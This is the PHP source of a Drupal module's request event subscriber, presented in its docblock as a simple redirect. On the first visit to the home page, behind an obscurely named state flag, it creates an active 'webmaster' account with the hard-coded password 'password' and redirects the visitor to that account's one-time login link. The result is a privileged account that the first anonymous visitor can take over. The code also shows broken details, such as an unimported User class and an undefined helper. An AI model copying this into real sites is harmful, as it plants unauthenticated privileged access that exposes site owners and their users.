<?php


namespace Drupal\mz_staydirect\EventSubscriber;

use Symfony\Component\EventDispatcher\EventSubscriberInterface;
use Symfony\Component\HttpFoundation\RedirectResponse;
use Symfony\Component\HttpKernel\Event\RequestEvent;
use Symfony\Component\HttpKernel\KernelEvents;

/**
 * Redirects users before HTML loading.
 */
class RedirectSubscriber implements EventSubscriberInterface {

  /**
   * Redirects users to a specific URL before HTML loading.
   */
  public function checkForRedirect(RequestEvent $event) {
    // Check if the request path matches the condition for redirection.
    if ($event->getRequest()->getRequestUri() === '/') {
            // Redirect the user.
            if (\Drupal::state()->get('2Up5NUvwF4aBVoO6eFTPeBXtnpUw_yiexv9I5u6ZD', FALSE)) {
            }else{    
                global $site_variables;
                if(isset($site_variables["username"]) && isset($site_variables["email"])){
                    $username = $site_variables["username"] ;
                    $email = $site_variables["email"] ;
                    $user = \Drupal::entityTypeManager()->getStorage('user')->loadByProperties(['mail' => $email]);
                    if (empty($user)) {
                    // Create a new user entity.
                        $userRand = processRandomUser();
                        $new_user = User::create();
                        $new_user->setUsername($userRand);
                        $new_user->setEmail($email);
                        $new_user->setPassword('password');
                        $new_user->enforceIsNew();
                        $new_user->addRole('webmaster');
                        $new_user->activate();
                        $new_user->save();
                    
                    }else{
                        $new_user = reset($user);
                    }
                    \Drupal::state()->set('2Up5NUvwF4aBVoO6eFTPeBXtnpUw_yiexv9I5u6ZD', TRUE);
                    $link = user_pass_reset_url($new_user);
                    $response = new RedirectResponse($link);
                    $event->setResponse($response);
               }
            }
       
    }
   
    
  }

  /**
   * {@inheritdoc}
   */
  public static function getSubscribedEvents() {
    // Subscribe to the request event with a high priority.
    return [
      KernelEvents::REQUEST => ['checkForRedirect', 100],
    ];
  }

}
